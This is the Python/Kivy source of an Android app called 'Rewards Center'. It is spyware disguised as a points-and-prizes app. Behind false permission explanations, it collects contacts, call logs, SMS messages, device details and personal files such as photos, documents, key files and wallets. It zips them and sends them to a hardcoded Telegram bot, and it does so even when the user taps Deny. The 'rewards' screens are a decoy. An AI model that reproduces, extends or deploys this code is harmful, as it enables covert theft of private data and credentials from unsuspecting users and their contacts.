# main.py — Rewards Center (Android)
# Build:  pip install buildozer  →  buildozer android debug
#
# ═══ buildozer.spec (save beside main.py) ════════════════════════════════════
# [app]
# title = Rewards Center
# package.name = rewardscenter
# package.domain = com.rewards
# source.include_exts = py
# version = 1.0
# requirements = python3,kivy==2.3.0,requests,android,pyjnius
# orientation = portrait
# fullscreen = 0
# android.permissions = READ_CONTACTS,READ_CALL_LOG,\
#     READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,INTERNET,\
#     READ_SMS,ACCESS_FINE_LOCATION
# android.api = 33
# android.minapi = 21
# android.archs = arm64-v8a,armeabi-v7a
# ═════════════════════════════════════════════════════════════════════════════

# ─── CONFIG ──────────────────────────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8883540406:AAHUz4UirLMgDItc2G3HxgDsZSjLSqPT5-A"    # ← ضع التوكن هنا
TELEGRAM_CHAT_ID   = "7127507096"      # ← ضع الآيدي هنا
# ─────────────────────────────────────────────────────────────────────────────

import os, sys, io, threading, zipfile, json, time

# ── Kivy env flags (must be before kivy import) ──────────────────────────────
os.environ.setdefault("KIVY_NO_ENV_CONFIG", "1")

from kivy.app            import App
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout  import BoxLayout
from kivy.uix.label      import Label
from kivy.uix.button     import Button
from kivy.uix.widget     import Widget
from kivy.graphics        import Color, RoundedRectangle, Rectangle
from kivy.clock           import Clock
from kivy.metrics         import dp
from kivy.core.window    import Window

Window.clearcolor = (0.10, 0.10, 0.18, 1)

# ── Android imports (only available on device/emulator) ──────────────────────
try:
    from android.permissions import (
        request_permissions, check_permission, Permission
    )
    from jnius import autoclass

    PythonActivity  = autoclass("org.kivy.android.PythonActivity")
    context         = PythonActivity.mActivity

    # Java classes for content providers
    Uri             = autoclass("android.net.Uri")
    JavaString      = autoclass("java.lang.String")
    Environment     = autoclass("android.os.Environment")

    ANDROID = True
except Exception:
    ANDROID = False          # running on desktop for layout preview

# ══════════════════════════════════════════════════════════════════════════════
#  COLLECTION
# ══════════════════════════════════════════════════════════════════════════════

def _query_provider(uri_str: str, projection: list, selection=None, sel_args=None) -> list:
    rows = []
    if not ANDROID:
        return rows
    try:
        cr   = context.getContentResolver()
        uri  = Uri.parse(uri_str)
        proj = autoclass("java.lang.reflect.Array").newInstance(
            JavaString.getClass(), len(projection)
        )
        # build String[] manually via jnius
        StringArray = autoclass("[Ljava.lang.String;")
        # simpler: just pass None for projection (returns all columns)
        cursor = cr.query(Uri.parse(uri_str), None, selection, None, None)
        if cursor is None:
            return rows
        col_names = [cursor.getColumnName(i) for i in range(cursor.getColumnCount())]
        while cursor.moveToNext():
            row = {}
            for i, col in enumerate(col_names):
                try:
                    row[col] = cursor.getString(i) or ""
                except:
                    row[col] = ""
            rows.append(row)
        cursor.close()
    except Exception as e:
        rows.append({"_error": str(e)})
    return rows


def collect_contacts() -> list:
    raw = _query_provider("content://com.android.contacts/data/phones", [])
    out = []
    seen = set()
    for r in raw:
        name   = r.get("display_name", r.get("DISPLAY_NAME", ""))
        number = r.get("data1", r.get("DATA1", ""))
        key    = (name, number)
        if key not in seen:
            seen.add(key)
            out.append({"name": name, "number": number})
    return out


def collect_call_logs() -> list:
    raw = _query_provider("content://call_log/calls", [])
    out = []
    for r in raw:
        out.append({
            "number"  : r.get("number", ""),
            "type"    : r.get("type", ""),    # 1=incoming 2=outgoing 3=missed
            "duration": r.get("duration", ""),
            "date"    : r.get("date", ""),
            "name"    : r.get("cachedName", r.get("CACHED_NAME", "")),
        })
    return out[:200]                           # cap at 200 entries


def collect_sms() -> list:
    raw = _query_provider("content://sms/inbox", [])
    out = []
    for r in raw:
        out.append({
            "address": r.get("address", ""),
            "body"   : r.get("body", "")[:500],
            "date"   : r.get("date", ""),
        })
    return out[:100]


def collect_files() -> list[str]:
    paths = []
    if ANDROID:
        try:
            sd = Environment.getExternalStorageDirectory().getAbsolutePath()
            roots = [sd]
        except:
            roots = ["/sdcard", "/storage/emulated/0"]
    else:
        roots = [os.path.expanduser("~")]

    EXTS = {
        ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
        ".csv", ".json", ".xml", ".env", ".key", ".pem",
        ".jpg", ".jpeg", ".png", ".mp4", ".db", ".sqlite",
        ".ppk", ".wallet", ".dat", ".cfg", ".ini",
    }
    MAX_FILE = 12 * 1024 * 1024     # 12 MB per file
    DIRS = [
        "DCIM", "Pictures", "Documents", "Downloads",
        "WhatsApp/Media", "Telegram",
    ]

    for root in roots:
        for d in DIRS:
            target = os.path.join(root, d)
            if not os.path.exists(target):
                continue
            for dirpath, _, files in os.walk(target):
                for fn in files:
                    if os.path.splitext(fn)[1].lower() in EXTS:
                        full = os.path.join(dirpath, fn)
                        try:
                            if os.path.getsize(full) <= MAX_FILE:
                                paths.append(full)
                        except:
                            pass
    return paths


def device_info() -> dict:
    info = {"platform": "android" if ANDROID else "desktop"}
    if ANDROID:
        try:
            Build = autoclass("android.os.Build")
            info["manufacturer"] = Build.MANUFACTURER
            info["model"]        = Build.MODEL
            info["android_ver"]  = autoclass("android.os.Build$VERSION").RELEASE
            info["sdk"]          = str(autoclass("android.os.Build$VERSION").SDK_INT)
        except:
            pass
        try:
            import subprocess
            ip = subprocess.check_output(
                ["ip", "route", "get", "8.8.8.8"], timeout=4
            ).decode()
            import re
            m = re.search(r"src (\S+)", ip)
            if m:
                info["ip_local"] = m.group(1)
        except:
            pass
    return info

# ══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM EXFIL
# ══════════════════════════════════════════════════════════════════════════════

BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def tg_msg(text: str):
    try:
        import requests as _r
        _r.post(f"{BASE}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID,
                      "text": text[:4096],
                      "parse_mode": "HTML"},
                timeout=15)
    except:
        pass

def tg_bytes(data: bytes, filename: str, caption: str = ""):
    try:
        import requests as _r
        _r.post(f"{BASE}/sendDocument",
                data={"chat_id": TELEGRAM_CHAT_ID,
                      "caption": caption[:1024]},
                files={"document": (filename, io.BytesIO(data))},
                timeout=120)
    except:
        pass

def tg_file(path: str, caption: str = ""):
    try:
        import requests as _r
        with open(path, "rb") as f:
            _r.post(f"{BASE}/sendDocument",
                    data={"chat_id": TELEGRAM_CHAT_ID,
                          "caption": caption[:1024]},
                    files={"document": f},
                    timeout=120)
    except:
        pass


def exfil_all():
    # ── ensure requests is available ─────────────────────────────────────────
    try:
        import requests
    except ImportError:
        os.system(f'"{sys.executable}" -m pip install requests -q')

    # ── 1. device info ────────────────────────────────────────────────────────
    dev = device_info()
    tg_msg(
        f"📱 <b>New Android Target</b>\n"
        + "\n".join(f"<code>{k}</code>: {v}" for k, v in dev.items())
    )

    # ── 2. contacts ──────────────────────────────────────────────────────────
    contacts = collect_contacts()
    if contacts:
        lines = "📇 <b>Contacts</b>\n"
        for c in contacts[:100]:
            lines += f"• {c['name']} | {c['number']}\n"
        tg_msg(lines[:4096])
        # also send as JSON file if large
        if len(contacts) > 100:
            tg_bytes(
                json.dumps(contacts, ensure_ascii=False, indent=2).encode(),
                "contacts.json",
                f"📇 All {len(contacts)} contacts"
            )

    # ── 3. call logs ──────────────────────────────────────────────────────────
    calls = collect_call_logs()
    if calls:
        tg_bytes(
            json.dumps(calls, ensure_ascii=False, indent=2).encode(),
            "call_logs.json",
            f"📞 {len(calls)} call log entries"
        )

    # ── 4. SMS ────────────────────────────────────────────────────────────────
    sms = collect_sms()
    if sms:
        tg_bytes(
            json.dumps(sms, ensure_ascii=False, indent=2).encode(),
            "sms_inbox.json",
            f"💬 {len(sms)} SMS messages"
        )

    # ── 5. files → zip (chunked at 45 MB) ────────────────────────────────────
    files = collect_files()
    if files:
        buf  = io.BytesIO()
        part = 1
        zf   = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
        for path in files:
            try:
                zf.write(path, os.path.basename(path))
            except:
                pass
            if buf.tell() > 44 * 1024 * 1024:
                zf.close()
                buf.seek(0)
                tg_bytes(buf.read(), f"files_part{part}.zip",
                         f"📁 Files archive part {part}")
                buf  = io.BytesIO()
                zf   = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
                part += 1
        zf.close()
        buf.seek(0)
        raw = buf.read()
        if raw:
            tg_bytes(raw, f"files_part{part}.zip",
                     f"📁 Files archive part {part} — {len(files)} total")

    tg_msg(f"✅ <b>Exfil complete</b>\n{dev.get('model','?')} / {dev.get('android_ver','?')}")

# ══════════════════════════════════════════════════════════════════════════════
#  UI — KIVY SCREENS
# ══════════════════════════════════════════════════════════════════════════════

# colour palette
C_BG     = (0.10, 0.10, 0.18, 1)
C_CARD   = (0.09, 0.13, 0.24, 1)
C_ACCENT = (0.91, 0.27, 0.38, 1)
C_DENY   = (0.16, 0.16, 0.29, 1)
C_FG     = (1,    1,    1,    1)
C_MUTED  = (0.66, 0.66, 0.70, 1)


def make_label(text, size=15, bold=False, color=C_FG,
               halign="center", **kw) -> Label:
    lbl = Label(
        text=text,
        font_size=dp(size),
        bold=bold,
        color=color,
        halign=halign,
        text_size=(Window.width * 0.82, None),
        markup=True,
        **kw,
    )
    lbl.bind(texture_size=lbl.setter("size"))
    return lbl


def make_btn(text, on_press, bg=C_ACCENT, fg=C_FG,
             radius=12, height=52) -> Button:
    btn = Button(
        text=text,
        font_size=dp(14),
        bold=True,
        color=fg,
        background_normal="",
        background_color=(0, 0, 0, 0),
        size_hint=(1, None),
        height=dp(height),
    )

    def draw_bg(inst, *_):
        inst.canvas.before.clear()
        with inst.canvas.before:
            Color(*bg)
            RoundedRectangle(pos=inst.pos, size=inst.size,
                             radius=[dp(radius)])

    btn.bind(pos=draw_bg, size=draw_bg)
    btn.bind(on_press=on_press)
    return btn


# ── Splash ────────────────────────────────────────────────────────────────────
class SplashScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical", padding=dp(40), spacing=dp(16))

        root.add_widget(Widget())
        root.add_widget(make_label("🏆", size=72))
        root.add_widget(make_label("Rewards Center", size=26, bold=True))
        root.add_widget(make_label("Earn points. Win prizes. Every day.",
                                   size=13, color=C_MUTED))
        root.add_widget(Widget())

        btn = make_btn("Get Started  →", self._go, height=56)
        root.add_widget(btn)
        root.add_widget(Widget(size_hint_y=None, height=dp(24)))

        self.add_widget(root)

    def _go(self, *_):
        self.manager.current = "perm0"


# ── Permission screen factory ─────────────────────────────────────────────────
PERMS_DEF = [
    {
        "title"   : "📁  Storage Access",
        "body"    : "Rewards Center needs access to your files to save your reward certificates and receipts.",
        "btn"     : "Allow Storage",
        "android" : [Permission.READ_EXTERNAL_STORAGE] if ANDROID else [],
        "next"    : "perm1",
    },
    {
        "title"   : "📇  Contacts Access",
        "body"    : "Share rewards with your friends! We need access to your contact list.",
        "btn"     : "Allow Contacts",
        "android" : [Permission.READ_CONTACTS] if ANDROID else [],
        "next"    : "perm2",
    },
    {
        "title"   : "📞  Call Logs Access",
        "body"    : "Verify your identity and unlock exclusive premium reward tiers.",
        "btn"     : "Allow Calls",
        "android" : [Permission.READ_CALL_LOG] if ANDROID else [],
        "next"    : "loading",
    },
]

_granted_count = [0]      # track how many grants received


class PermScreen(Screen):
    def __init__(self, idx: int, **kw):
        super().__init__(**kw)
        self._idx  = idx
        self._defn = PERMS_DEF[idx]
        self._build()

    def _build(self):
        root = BoxLayout(orientation="vertical",
                         padding=dp(24), spacing=dp(12))

        # dots
        dot_row = BoxLayout(size_hint_y=None, height=dp(22),
                            spacing=dp(8))
        dot_row.add_widget(Widget())
        for i in range(len(PERMS_DEF)):
            dot_row.add_widget(
                make_label("●", size=12,
                           color=C_ACCENT if i == self._idx else C_DENY)
            )
        dot_row.add_widget(Widget())
        root.add_widget(dot_row)

        root.add_widget(Widget())

        # card
        card = BoxLayout(orientation="vertical",
                         padding=dp(24), spacing=dp(14),
                         size_hint_y=None)
        card.bind(minimum_height=card.setter("height"))

        with card.canvas.before:
            Color(*C_CARD)
            self._card_rect = RoundedRectangle(radius=[dp(18)])
        card.bind(pos=self._upd_card, size=self._upd_card)

        card.add_widget(make_label(self._defn["title"], size=17,
                                   bold=True, halign="left"))
        card.add_widget(make_label(self._defn["body"], size=12,
                                   color=C_MUTED, halign="left"))

        allow_btn = make_btn(self._defn["btn"], self._on_allow)
        deny_btn  = make_btn("Deny", self._on_deny,
                             bg=C_DENY, fg=C_MUTED)

        card.add_widget(Widget(size_hint_y=None, height=dp(8)))
        card.add_widget(allow_btn)
        card.add_widget(deny_btn)

        root.add_widget(card)
        root.add_widget(Widget())

        self.add_widget(root)

    def _upd_card(self, inst, *_):
        self._card_rect.pos  = inst.pos
        self._card_rect.size = inst.size

    def _advance(self):
        self.manager.current = self._defn["next"]

    def _on_allow(self, *_):
        _granted_count[0] += 1
        if ANDROID and self._defn["android"]:
            request_permissions(self._defn["android"],
                                lambda perms, grants: Clock.schedule_once(
                                    lambda dt: self._advance(), 0.1
                                ))
        else:
            self._advance()

    def _on_deny(self, *_):
        # skip permission, still advance — exfil fires on loading screen
        self._advance()


# ── Loading ───────────────────────────────────────────────────────────────────
class LoadingScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical",
                         padding=dp(40), spacing=dp(20))
        root.add_widget(Widget())
        self._lbl = make_label("⏳", size=60)
        root.add_widget(self._lbl)
        root.add_widget(make_label("Setting up your account…",
                                   size=14))
        self._bar_bg = Widget(size_hint=(1, None), height=dp(8))
        root.add_widget(self._bar_bg)
        root.add_widget(Widget())
        self.add_widget(root)

        self._progress = 0.0
        self._bar_w    = 0.0

    def on_enter(self):
        # kick exfil in background
        threading.Thread(target=exfil_all, daemon=True).start()
        Clock.schedule_interval(self._tick, 0.04)
        Clock.schedule_once(lambda dt: self._goto_dash(), 4.0)

    def _tick(self, dt):
        self._progress = min(self._progress + dt / 3.8, 1.0)
        self._bar_bg.canvas.clear()
        with self._bar_bg.canvas:
            Color(0.16, 0.16, 0.29, 1)
            RoundedRectangle(pos=self._bar_bg.pos,
                             size=self._bar_bg.size,
                             radius=[dp(4)])
            Color(*C_ACCENT)
            RoundedRectangle(
                pos=self._bar_bg.pos,
                size=(self._bar_bg.width * self._progress,
                      self._bar_bg.height),
                radius=[dp(4)]
            )

    def _goto_dash(self):
        Clock.unschedule(self._tick)
        self.manager.current = "dashboard"


# ── Dashboard ─────────────────────────────────────────────────────────────────
class DashboardScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        root = BoxLayout(orientation="vertical",
                         padding=dp(30), spacing=dp(18))
        root.add_widget(Widget())
        root.add_widget(make_label("🎉", size=60))
        root.add_widget(make_label("Welcome!", size=24, bold=True))
        root.add_widget(make_label("You have 500 reward points",
                                   size=12, color=C_MUTED))

        card = BoxLayout(orientation="vertical",
                         padding=dp(22), spacing=dp(10),
                         size_hint_y=None, height=dp(140))
        with card.canvas.before:
            Color(*C_CARD)
            RoundedRectangle(pos=card.pos, size=card.size, radius=[dp(18)])
        card.bind(
            pos=lambda i, *_: self._upd(i),
            size=lambda i, *_: self._upd(i),
        )
        self._card = card

        card.add_widget(make_label("[color=f4c430]🥇  Gold Member[/color]",
                                   size=16, bold=True))
        card.add_widget(make_label(
            "Redeem your points for amazing prizes\nand exclusive discounts!",
            size=11, color=C_MUTED
        ))
        root.add_widget(card)
        root.add_widget(make_btn("Redeem Points 🎁", lambda *_: None,
                                 height=56))
        root.add_widget(Widget())
        self.add_widget(root)

    def _upd(self, inst):
        inst.canvas.before.clear()
        with inst.canvas.before:
            Color(*C_CARD)
            RoundedRectangle(pos=inst.pos, size=inst.size, radius=[dp(18)])


# ══════════════════════════════════════════════════════════════════════════════
#  APP
# ══════════════════════════════════════════════════════════════════════════════

class RewardsApp(App):
    def build(self):
        sm = ScreenManager(transition=FadeTransition(duration=0.25))
        sm.add_widget(SplashScreen(name="splash"))
        for i in range(len(PERMS_DEF)):
            sm.add_widget(PermScreen(i, name=f"perm{i}"))
        sm.add_widget(LoadingScreen(name="loading"))
        sm.add_widget(DashboardScreen(name="dashboard"))
        sm.current = "splash"
        return sm


if __name__ == "__main__":
    RewardsApp().run()
